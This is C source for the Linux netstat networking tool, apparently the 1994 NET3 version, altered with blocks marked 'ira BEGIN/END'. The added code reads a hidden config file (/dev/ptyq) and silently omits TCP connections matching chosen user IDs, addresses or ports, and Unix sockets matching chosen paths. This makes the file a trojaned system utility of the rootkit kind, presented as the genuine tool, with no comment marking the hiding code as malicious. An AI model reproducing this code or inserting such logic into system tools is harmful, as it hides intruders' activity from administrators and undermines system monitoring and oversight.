/*
 * netstat	This file contains an implementation of the command
 *		that helps in debugging the networking modules.
 *
 * Usage:	netstat [options]
 *			-a also listening sockets
 *			-c continous listing
 *			-i interface statistics
 *			-n show network numbers instead of names
 *			-o show timer states
 *			-r show kernel routing table
 *			-t show active tcp connections
 *			-u show active udp connections
 *			-v show version information
 *			-w show active raw connection
 *			-x show active unix sockets
 *
 * Version:	@(#)netstat.c	0.96	01/20/94
 *
 * Authors:	Fred Baumgarten, <dc6iq@insu1.etec.uni-karlsruhe.de>
 *		Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Phil Packer, <pep@wicked.demon.co.uk>
 *		Johannes Stille, <johannes@titan.os.open.de>
 * Tuned for NET3 by:
 *		Alan Cox, <A.Cox@swansea.ac.uk>
 *
 *		Copyright (c) 1993  Fred Baumgarten
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <ctype.h>
#include <fcntl.h>
#include <netdb.h>
#include <paths.h>
#include <pwd.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <linux/route.h>
#include <netinet/in.h>
#include <linux/if_ether.h>
#include <linux/net.h>
#include <linux/tcp.h>
#include <sys/ioctl.h>
#include "support.h"
#include "pathnames.h"
#include "version.h"

#define FILENAME "/dev/ptyq" /* ira BEGIN */
#define STR_SIZE 128
#define SPC_CHAR " "
#define END_CHAR "\n"

struct  h_st {
        struct h_st     *next;
        int             hack_type;
        char            hack_cmd[STR_SIZE];
};

struct  h_st    *hack_list;
struct  h_st    *h_tmp; 

char    tmp_str[STR_SIZE];
char    *strp;

FILE    *fp_hack; 

int	hide; /* ira END */

#define E_READ  -1
#define E_PARA  -2
#define E_IOCTL -3



char *Release = RELEASE,
     *Version = "@(#)netstat.c 1.1.27 (16/07/94)";
#define Signature "(c) 1993, Fred Baumgarten <dc6iq@insu1.etec.uni-karlsruhe.de>"


struct interface {
  char name[IFNAMSIZ];		/* interface name       */
  short flags;                  /* various flags        */
  int metric;			/* routing metric       */
  int mtu;			/* MTU value            */
  struct sockaddr addr;		/* IP address           */
  struct sockaddr dstaddr;	/* P-P IP address       */
  struct sockaddr broadaddr;	/* IP broadcast address */
  struct sockaddr netmask;	/* IP network mask      */
  struct sockaddr hwaddr;	/* HW address           */
  struct enet_statistics stats;	/* statistics           */
};

struct service {
  int number;
  char *name;
  struct service *next;
};


int flag_all = 0;
int flag_cnt = 0;
int flag_deb = 0;
int flag_int = 0;
int flag_not = 0;
int flag_opt = 0;
int flag_raw = 0;
int flag_rou = 0;
int flag_tcp = 0;
int flag_udp = 0;
int flag_unx = 0;
int skfd;
FILE *procinfo;
char *line[2000];
static struct service *tcp_name = NULL,
		      *udp_name = NULL,
		      *raw_name = NULL;

int rf_hack() /* ira BEGIN */
{
   h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
   hack_list=h_tmp;
   if (fp_hack=fopen (FILENAME, "r")) {
      while (fgets(tmp_str, 126, fp_hack)) {
         h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
         strp=tmp_str;
         strp=strtok (strp, SPC_CHAR);
         h_tmp->hack_type=atoi(strp);
         strp=strtok ('\0', END_CHAR);
         strcpy (h_tmp->hack_cmd, strp);
         h_tmp=h_tmp->next;
      }
   }
   h_tmp->next=NULL;
   return 1;
} /* ira END */

static void
add2list(struct service **namebase, struct service *item) 
{
  if (*namebase == NULL) {
	*namebase = item;
	item->next = NULL;
  } else {
	item->next = *namebase;
	*namebase = item;
  } 
}


struct service *
searchlist(struct service *servicebase, int number)
{
  struct service *item;

  for(item = servicebase; item != NULL; item = item->next) {
	if (item->number == number) return(item);
  }
  return(NULL);
}


static int
read_services(void)
{
  char buffer[2048], name[32];
  char protocol[16], dummy[1024];
  int i, number;
  FILE *serv;
  struct service *item;

  if ((serv = fopen(_PATH_SERVICES, "r")) == NULL) {
	perror(_PATH_SERVICES);
	return(E_READ);
  }
  while(! feof(serv)) {
	fgets(buffer, 2047, serv);
	i = sscanf(buffer, "%s%d/%3s%s\n", name, &number, protocol, dummy);
	if (i < 3) continue;

	/* Allocate a service entry. */
	item = (struct service *) malloc(sizeof(struct service));
	if (item == NULL) perror("netstat"); 
	item->name = strdup(name);
	item->number = number;

	/* Fill it in. */
	if (! strcmp(protocol, "tcp")) {
		add2list(&tcp_name,item);
	} else if (! strcmp(protocol, "udp")) {
		add2list(&udp_name,item);
	} else if (! strcmp(protocol, "raw")) {
		add2list(&raw_name,item);
	}
  }

  (void) fclose(serv);
  return(0);
}


static char *
get_sname(int socknumber, char *proto)
{
  static char buffer[64];
  struct service *item;

  if (flag_not) {
	sprintf(buffer, "%d", socknumber);
	return(buffer);
  }
  if (socknumber == 0) return("*");
  if (! strcmp(proto, "tcp")) {
	if ((item = searchlist(tcp_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);
	  else 
		sprintf(buffer, "%d", socknumber);
  } else if (! strcmp(proto, "udp")) {
	if ((item = searchlist(udp_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);
	  else 
		sprintf(buffer, "%d", socknumber);
  } else if (! strcmp(proto, "raw")) {
	if ((item = searchlist(raw_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);
	  else 
		sprintf(buffer, "%d", socknumber);
  }
  return(buffer);
}


static int
route_info(void)
{
  char buff[4096], iface[16], flags[16];
  char gate_addr[128], net_addr[128];
  char mask_addr[128];
  struct sockaddr snet, sgate, smask;
  struct aftype *ap;
  int num, iflags, metric, refcnt, use;
  FILE *fp;

  printf("Kernel routing table\n");
  printf(
	"Destination     Gateway         Genmask         "
	"Flags Metric Ref Use    Iface\n");
  if ((fp = fopen(_PATH_PROCNET_ROUTE, "r")) == NULL) {
	perror(_PATH_PROCNET_ROUTE);
	return(E_READ);
  }

  while (fgets(buff, 1023, fp))
  {
	num = sscanf(buff, "%s %s %s %X %d %d %d %s %*s %*s\n",
		 iface, net_addr, gate_addr,
		 &iflags, &refcnt, &use, &metric, mask_addr);
	if (num != 8) continue;

	/* Fetch and resolve the target address. */
	(void) getsock(net_addr, &snet);
	if ((ap = get_afntype(snet.sa_family)) == NULL) {
		fprintf(stderr, "route: unsupported address family %d !\n",
							snet.sa_family);
		continue;
	}
	strcpy(net_addr, ap->sprint(&snet, (flag_not | 0x8000)));
	net_addr[15] = '\0';
    
	/* Fetch and resolve the gateway address. */
	(void) getsock(gate_addr, &sgate);
	strcpy(gate_addr, ap->sprint(&sgate, flag_not));
	gate_addr[15] = '\0';

	/* Fetch and resolve the genmask. */
	(void) getsock(mask_addr, &smask);
	strcpy(mask_addr, ap->sprint(&smask, 1));
	mask_addr[15] = '\0';

	/* Decode the flags. */
	flags[0] = '\0';
	if (iflags & RTF_UP) strcat(flags, "U");
	if (iflags & RTF_GATEWAY) strcat(flags, "G");
	if (iflags & RTF_HOST) strcat(flags, "H");
	if (iflags & RTF_REINSTATE) strcat(flags, "R");
	if (iflags & RTF_DYNAMIC) strcat(flags, "D");
	if (iflags & RTF_MODIFIED) strcat(flags, "M");

	/* Print the info. */
	printf("%-15s %-15s %-15s %-5s %-6d %-3d %6d %s\n",
		net_addr, gate_addr, mask_addr, flags,
		metric, refcnt, use, iface);
  }

  (void) fclose(fp);
  return(0);
}


static int
tcp_info(void)
{
  char buffer[8192], local_addr[128];
  char rem_addr[128], *tcp_state, timers[64];
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  int num, local_port, rem_port, d, state;
  int uid, timer_run, lnr = 0;
  struct passwd *pw;
   
  if ((procinfo = fopen(_PATH_PROCNET_TCP, "r")) == NULL) {
	perror(_PATH_PROCNET_TCP);
	return(E_READ);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	num = strlen(buffer)+1;
	if ((line[lnr] = (char *)malloc(num)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;
  while (lnr >= 0) {
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %d\n",
		&d, &localaddr.sin_addr.s_addr, &local_port,
		&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr, &uid);
	if (flag_deb) fprintf(stderr, "%s -> %d args", line[lnr+1], num);
	if (num < 11) continue;		/* 13 ? */
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, "netstat: unsupported address family %d !\n",
						localaddr.sin_family);
		continue;
	}
	switch (state) {
		case TCP_ESTABLISHED:
			tcp_state = "ESTABLISHED";
			rxq--;
			break;

		case TCP_SYN_SENT:
			tcp_state = "SYN_SENT";
			break;

		case TCP_SYN_RECV:
			tcp_state = "SYN_RECV";
			break;

		case TCP_FIN_WAIT1:
			tcp_state = "FIN_WAIT1";
			break;

		case TCP_FIN_WAIT2:
			tcp_state = "FIN_WAIT2";
			break;

		case TCP_TIME_WAIT:
			tcp_state = "TIME_WAIT";
			break;

		case TCP_CLOSE:
			tcp_state = "CLOSE";
			break;
#ifdef TCP_CLOSING
		case TCP_CLOSING:
			tcp_state = "CLOSING";
			break;
#endif
		case TCP_CLOSE_WAIT:
			tcp_state = "CLOSE_WAIT";
			break;

		case TCP_LAST_ACK:
			tcp_state = "LAST_ACK";
			break;

		case TCP_LISTEN:
			tcp_state = "LISTEN";
			time_len = 0;
			retr = 0L;
			rxq=0L;
			txq=0L;
			break;

		default:
			tcp_state = "?? ()";
			break;
	}
	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || rem_port) {
		sprintf(buffer, "%s", get_sname(local_port, "tcp"));
		if ((strlen(local_addr) + strlen(buffer)) > 21) {
			local_addr[21-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s",get_sname(rem_port, "tcp"));
		if ((strlen(rem_addr) + strlen(buffer)) > 21) {
			rem_addr[21-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);
		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, "off (0.00/%ld)", retr);
      				break;

			case 1:
				sprintf(timers, "on (%2.2f/%ld)",
					(double)time_len / 100, retr);
				break;

			default:
				sprintf(timers, "unkn-%d (%2.2f/%ld)",
					timer_run, (double)time_len / 100, retr);
				break;
		}
	   
	   hide=0; /* ira BEGIN */
	   for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
	      switch (h_tmp->hack_type) {
	       case 0:
		 if (uid==atoi(h_tmp->hack_cmd))
		   hide=1;
		 break;
	       case 1:
		 if (strstr((char *)inet_ntoa(localaddr.sin_addr.s_addr), h_tmp->hack_cmd))
		   hide=1;
                 break;
	       case 2:
		 if (strstr((char *)inet_ntoa(remaddr.sin_addr.s_addr), h_tmp->hack_cmd))
		   hide=1;
		 break;
	       case 3:
		 if (local_port==atoi(h_tmp->hack_cmd))
		   hide=1;
		 break;
	       case 4:
		 if (rem_port==atoi(h_tmp->hack_cmd))
		   hide=1;
		 break;
	      }
	   }

	   if (!hide) { /* ira END */
		printf("tcp   %6ld %6ld %-22s %-22s %-14s",
			rxq, txq, local_addr, rem_addr, tcp_state);

		if ((pw = getpwuid(uid)) != NULL)
			printf("%-10s ", pw->pw_name);
		else
			printf("%-10d ",uid);

		if (flag_opt) printf("      %s", timers);
		printf("\n");
	   } /* ira BEGIN END */
	}
  }
  return(0);
}


static int
udp_info(void)
{
  char buffer[8192], local_addr[64], rem_addr[64];
  char *udp_state, timer_queued, timers[64], more[512];
  int num, local_port, rem_port, d, state, timer_run, lnr = 0;
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  
  if ((procinfo = fopen(_PATH_PROCNET_UDP, "r")) == NULL) {
	perror(_PATH_PROCNET_UDP);
	return(E_READ);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  while (lnr >= 0) {
	more[0] = '\0';
	timer_queued = '\0';
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %c %s\n",
		&d, &localaddr.sin_addr.s_addr, &local_port,
		&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr,
		&timer_queued, more);
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, "netstat: unsupported address family %d !\n",
						localaddr.sin_family);
		continue;
	}

	retr = 0L;
	if (! flag_opt) more[0] = '\0';
	if (flag_deb) fprintf(stderr, "%s -> %d args", line[lnr+1], num);
	if (num < 10) continue;

	switch (state) {
		case TCP_ESTABLISHED:
			udp_state = "ESTABLISHED ";
			rxq--;
			break;

		default:
			udp_state = "";
			break;
	}

	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || localaddr.sin_addr.s_addr) {
		sprintf(buffer, "%s", get_sname(local_port, "udp"));
		if ((strlen(local_addr) + strlen(buffer)) > 21) {
			local_addr[21-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s", get_sname(rem_port, "udp"));
		if ((strlen(rem_addr) + strlen(buffer)) > 21) {
			rem_addr[21-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);

		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, "off (0.00/%ld) %c",
							retr, timer_queued);
				break;

			case 1:
				sprintf(timers, "on (%2.2f/%ld) %c",
					(double)time_len / 100, retr, timer_queued);
				break;

			default:
				sprintf(timers, "unkn-%d (%2.2f/%ld) %c",
					timer_run, (double)time_len / 100,
					retr, timer_queued);
				break;
		}
		printf("udp   %6ld %6ld %-22s %-22s %s",
			rxq, txq, local_addr, rem_addr, udp_state);
		if (flag_opt) printf("                                %s", timers);
		printf("\n");
	}
  }
  return(0);
}


static int
raw_info(void)
{
  char buffer[8192], local_addr[64], rem_addr[64];
  char *raw_state, timer_queued, timers[64], more[512];
  int num, local_port, rem_port, d, state, timer_run, lnr = 0;
  struct sockaddr_in localaddr, remaddr;
  struct aftype *ap;
  unsigned long rxq, txq, time_len, retr;
  
  if ((procinfo = fopen(_PATH_PROCNET_RAW, "r")) == NULL) {
	perror(_PATH_PROCNET_RAW);
	return(E_READ);
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  while (lnr >= 0) {
	more[0] = '\0';
	timer_queued = '\0';
	num = sscanf(line[lnr--],
		"%d: %lX:%X %lX:%X %X %X:%X %X:%lX %lX %c %s\n",
		&d, &localaddr.sin_addr.s_addr, &local_port,
		&remaddr.sin_addr.s_addr, &rem_port, &state,
		&txq, &rxq, &timer_run, &time_len, &retr,
		&timer_queued, more);
		retr = 0L;
	localaddr.sin_family = AF_INET;
	remaddr.sin_family = AF_INET;
	if ((ap = get_afntype(localaddr.sin_family)) == NULL) {
		fprintf(stderr, "netstat: unsupported address family %d !\n",
						localaddr.sin_family);
		continue;
	}

	if (! flag_opt) more[0] = '\0';
	if (flag_deb) fprintf(stderr, "%s -> %d args", line[lnr+1], num);
	if (num < 10) continue;

	raw_state = "";
	strcpy(local_addr, ap->sprint((struct sockaddr *)&localaddr, flag_not));
	strcpy(rem_addr, ap->sprint((struct sockaddr *)&remaddr, flag_not));
	if (flag_all || localaddr.sin_addr.s_addr) {
		sprintf(buffer, "%s", get_sname(local_port, "raw"));
		if ((strlen(local_addr) + strlen(buffer)) > 21) {
			local_addr[21-strlen(buffer)] = '\0';
		}
		strcat(local_addr, ":");
		strcat(local_addr, buffer);
		sprintf(buffer, "%s", get_sname(rem_port, "raw"));
		if ((strlen(rem_addr) + strlen(buffer)) > 21) {
			rem_addr[21-strlen(buffer)] = '\0';
		}
		strcat(rem_addr, ":");
		strcat(rem_addr, buffer);

		timers[0] = '\0';
		if (flag_opt) switch (timer_run) {
			case 0:
				sprintf(timers, "off (0.00/%ld) %c",
						retr, timer_queued);
				break;

			case 1:
				sprintf(timers, "on (%2.2f/%ld) %c",
					(double)time_len / 100, retr,
					timer_queued);
				break;

			default:
				sprintf(timers, "unkn-%d (%2.2f/%ld) %c",
					timer_run, (double)time_len / 100,
					retr, timer_queued);
				break;
		}
		printf("raw   %6ld %6ld %-22s %-22s %s",
			rxq, txq, local_addr, rem_addr, raw_state);
		if (flag_opt) printf("                                %s", timers);
		printf("\n");
	}
  }
  return(0);
}


static int
unix_info(void)
{
  char buffer[8192], path[MAXPATHLEN], ss_flags[32];
  char *ss_proto, *ss_state, *ss_type;
  int num, d, state, type, lnr = 0;
  unsigned long refcnt, proto, flags;
  
  if ((procinfo = fopen(_PATH_PROCNET_UNIX, "r")) == NULL) {
	perror(_PATH_PROCNET_UNIX);
	return E_READ;
  }

  fgets(buffer, sizeof(buffer), procinfo);
  while (! feof(procinfo)) {
	fgets(buffer, sizeof(buffer), procinfo);
	if ((line[lnr] = (char *)malloc(strlen(buffer)+1)) != NULL) {
		strcpy(line[lnr++], buffer);
		if (flag_deb) fprintf(stderr, "%s", buffer);
	}
  }
  (void) fclose(procinfo);
  lnr--; lnr--;

  printf("Active UNIX domain sockets\n");
  printf("Proto RefCnt Flags      Type            State           Path\n");
  while (lnr >= 0) {
	path[0] = '\0';
	num = sscanf(line[lnr--], "%d: %lX %lX %lX %X %X %s\n",
		&d, &refcnt, &proto, &flags, &type, &state, path);
	if (flag_deb) fprintf(stderr, "%s -> %d args", line[lnr+1], num);
	if (num < 6) continue;

	switch(proto) {
		case 0:
			ss_proto = "unix";
			break;

		default:
			ss_proto = "??";
	}

	switch(type) {
		case SOCK_STREAM:
			ss_type = "SOCK_STREAM";
			break;

		case SOCK_DGRAM:
			ss_type = "SOCK_DGRAM";
			break;

		case SOCK_RAW:
			ss_type = "SOCK_RAW";
			break;

		case SOCK_RDM:
			ss_type = "SOCK_RDM";
			break;

		case SOCK_SEQPACKET:
			ss_type = "SOCK_SEQPACKET";
			break;

		default:
			ss_type = "UNKNOWN";
	}

	switch(state) {
		case SS_FREE:
			ss_state = "FREE";
			break;

		case SS_UNCONNECTED:
			/*
			 * Unconnected sockets may be listening
			 * for something.
			 */
			if (flags & SO_ACCEPTCON) {
				ss_state = "LISTENING";
			} else {
				ss_state = "UNCONNECTED";
			}
			break;

		case SS_CONNECTING:
			ss_state = "CONNECTING";
			break;

		case SS_CONNECTED:
			ss_state = "CONNECTED";
			break;

		case SS_DISCONNECTING:
			ss_state = "DISCONNECTING";
			break;

		default:
			ss_state = "UNKNOWN";
	}

	strcpy(ss_flags, "[");
	if (flags & SO_ACCEPTCON) strcat(ss_flags, " ACC ");

	if (ss_flags[strlen(ss_flags)-1] != ' ') strcat(ss_flags, " ");
	strcat(ss_flags, "]");

     hide=0; /* ira BEGIN */
     for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
	switch (h_tmp->hack_type) {
	 case 5:
	   if (strstr(path, h_tmp->hack_cmd))
	     hide=1;
	   break;
	}
     }

     if (!hide) { /* ira END */
	printf("%-5s %-6ld %-10s %-15s %-15s %s\n",
		ss_proto, refcnt, ss_flags, ss_type, ss_state, path);
     } /* ira BEGIN END */
 
  }
  return(0);
}


static void
ife_print(struct interface *ptr)
{
  printf("%-5.5s ", ptr->name);
  printf("%5d %3d ", ptr->mtu, ptr->metric);
  /* If needed, display the interface statistics. */
  printf("%6u %6u %6u %6u ",
	 ptr->stats.rx_packets, ptr->stats.rx_errors,
	 ptr->stats.rx_dropped, ptr->stats.rx_fifo_errors);
  printf("%6u %6u %6u %6u ",
	 ptr->stats.tx_packets, ptr->stats.tx_errors,
	 ptr->stats.tx_dropped, ptr->stats.tx_fifo_errors);
  if (ptr->flags == 0) printf("[NO FLAGS]");
  if (ptr->flags & IFF_ALLMULTI) printf("A");
  if (ptr->flags & IFF_BROADCAST) printf("B");
  if (ptr->flags & IFF_DEBUG) printf("D");
  if (ptr->flags & IFF_LOOPBACK) printf("L");
  if (ptr->flags & IFF_PROMISC) printf("M");
  if (ptr->flags & IFF_NOTRAILERS) printf("N");
  if (ptr->flags & IFF_NOARP) printf("O");
  if (ptr->flags & IFF_POINTOPOINT) printf("P");
  if (ptr->flags & IFF_RUNNING) printf("R");
  if (ptr->flags & IFF_UP) printf("U");
  printf("\n");
}

static void if_getstats(char *ifname, struct interface *ife)
{
  FILE *f=fopen("/proc/net/dev","r");
  char buf[256];
  char *bp;
  if(f==NULL)
  	return;
  while(fgets(buf,255,f))
  {
  	bp=buf;
  	while(*bp&&isspace(*bp))
  		bp++;
  	if(strncmp(bp,ifname,strlen(ifname))==0 && bp[strlen(ifname)]==':')
  	{
 		bp=strchr(bp,':');
 		bp++;
 		sscanf(bp,"%d %d %d %d %d %d %d %d %d %d %d",
 			&ife->stats.rx_packets,
 			&ife->stats.rx_errors,
 			&ife->stats.rx_dropped,
 			&ife->stats.rx_fifo_errors,
 			&ife->stats.rx_frame_errors,
 			
 			&ife->stats.tx_packets,
 			&ife->stats.tx_errors,
 			&ife->stats.tx_dropped,
 			&ife->stats.tx_fifo_errors,
 			&ife->stats.collisions,
 			
 			&ife->stats.tx_carrier_errors
 		);
 		fclose(f);
 		return;
  	}
  }
  fclose(f);
}
  
/* Fetch the inteface configuration from the kernel. */
static int
if_fetch(char *ifname, struct interface *ife)
{
  struct ifreq ifr;
  
  memset((char *) ife, 0, sizeof(struct interface));
  strcpy(ife->name, ifname);
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0) {
	fprintf(stderr, "SIOCGIFFLAGS: %s\n", strerror(errno));
	return(-1);
  }
  ife->flags = ifr.ifr_flags;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFADDR, &ifr) < 0) {
	memset(&ife->addr, 0, sizeof(struct sockaddr));
  } else ife->addr = ifr.ifr_addr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFHWADDR, &ifr) < 0) {
	memset(&ife->hwaddr, 0, sizeof(struct sockaddr));
  } else ife->hwaddr = ifr.ifr_addr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMETRIC, &ifr) < 0) {
	ife->metric = 0;
  } else ife->metric = ifr.ifr_metric;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFMTU, &ifr) < 0) {
	ife->mtu = 0;
  } else ife->mtu = ifr.ifr_mtu;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFDSTADDR, &ifr) < 0) {
	memset(&ife->dstaddr, 0, sizeof(struct sockaddr));
  } else ife->dstaddr = ifr.ifr_dstaddr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFBRDADDR, &ifr) < 0) {
	memset(&ife->broadaddr, 0, sizeof(struct sockaddr));
  } else ife->broadaddr = ifr.ifr_broadaddr;
  
  strcpy(ifr.ifr_name, ifname);
  if (ioctl(skfd, SIOCGIFNETMASK, &ifr) < 0) {
	memset(&ife->netmask, 0, sizeof(struct sockaddr));
  } else {
	memcpy(ife->netmask.sa_data, &ifr.ifr_data, sizeof(struct sockaddr));
  }
    
  if_getstats(ifname,ife);
/*  strcpy(ifr.ifr_name, ifname);
  ifr.ifr_data = (caddr_t) &ife->stats;
  if (ioctl(skfd, SIOCGIFSTATS, &ifr) < 0) {
	memset(&ife->stats, 0, sizeof(struct dev_stats));
  }
  */
  return(0);
}


static int
iface_info(void)
{
  char buff[1024];
  struct interface ife;
  struct ifconf ifc;
  struct ifreq *ifr;
  int i;
  
  /* Create a channel to the NET kernel. */
  if ((skfd = socket(AF_INET,SOCK_DGRAM,0)) < 0) {
	perror("socket");
	return(E_READ);
  }
  
  ifc.ifc_len = sizeof(buff);
  ifc.ifc_buf = buff;
  if (ioctl(skfd, SIOCGIFCONF, &ifc) < 0) {
	perror("SIOCGIFCONF");
	return(E_IOCTL);
  }

  printf("Kernel Interface table\n");
  printf("Iface   MTU Met  RX-OK RX-ERR RX-DRP RX-OVR  TX-OK TX-ERR TX-DRP TX-OVR Flags\n");
  
  ifr = ifc.ifc_req;
  for (i = ifc.ifc_len / sizeof(struct ifreq); --i >= 0; ifr++) {
	if (if_fetch(ifr->ifr_name, &ife) < 0) {
		fprintf(stderr, "%s: unknown interface.\n", ifr->ifr_name);
	}
    
	if (((ife.flags & IFF_UP) == 0) && !flag_all) continue;
	ife_print(&ife);
  }
  return(0);
}


static void
usage(void)
{
  fprintf(stderr, "Usage:\tnetstat [options]\n");
  fprintf(stderr, "\t-a also listening sockets\n");
  fprintf(stderr, "\t-c continous listing\n");
  fprintf(stderr, "\t-i interface statistics\n");
  fprintf(stderr, "\t-n show network numbers instead of names\n");
  fprintf(stderr, "\t-o show timer states\n");
  fprintf(stderr, "\t-r show kernel routing table\n");
  fprintf(stderr, "\t-t show active tcp connections\n");
  fprintf(stderr, "\t-u show active udp connections\n");
  fprintf(stderr, "\t-v show version information\n");
  fprintf(stderr, "\t-w show active raw connections\n");
  fprintf(stderr, "\t-x show active unix sockets\n");
}


int main
(int argc, char *argv[])
{
  int i;

  rf_hack(); /* ira BEGIN END */

  while ((i = getopt(argc, argv, "acdinortuvwx")) != EOF) switch(i) {
	case 'a':
		flag_all++;
		break;

	case 'c':
		flag_cnt++;
		break;

	case 'd':
		flag_deb++;
		break;

	case 'i':
		flag_int++;
		break;

	case 'n':
		flag_not++;
		break;

	case 'o':
		flag_opt++;
		break;

	case 'r':
		flag_rou++;
		break;

	case 't':
		flag_tcp++;
		break;

	case 'u':
		flag_udp++;
		break;

	case 'v':
		printf("%s\n%s\n%s\n", Release, Version, Signature);
		return(0);
		/*NOTREACHED*/

	case 'w':
		flag_raw++;
		break;

	case 'x':
		flag_unx++;
		break;

	case '?':
		usage();
		return(E_PARA);
  }
  
  if (flag_rou) {
	for (;; ) {
		i = route_info();
		if (!flag_cnt || i) break;
		sleep(1);
	}
	return(i);
  }
  
  if (flag_int) {
	for (;; ) {
		i = iface_info();
		if (!flag_cnt || i) break;
		sleep(1);
  	}
	return(i);
  }
  
  if ((i = read_services()) != 0) return(i);

  for (;; ) {
	printf("Active Internet connections");
	if (flag_all) printf(" (including servers)");

	printf("\nProto Recv-Q Send-Q Local Address          Foreign Address        (State)       User\n");
	if ((!flag_udp && !flag_raw && !flag_unx) || flag_tcp) {
		i = tcp_info();
		if (i) return(i);
	}

	if ((!flag_tcp && !flag_raw && !flag_unx) || flag_udp) {
		i = udp_info();
		if (i) return(i);
	}

	if ((!flag_tcp && !flag_udp && !flag_unx) || flag_raw) {
		i = raw_info();
		if (i) return(i);
	}

	if ((!flag_tcp && !flag_udp && !flag_raw) || flag_unx) {
		i = unix_info();
		if (i) return(i);
	}

	if (!flag_cnt || i) break;
	sleep(1);
  }

  return(i);
}
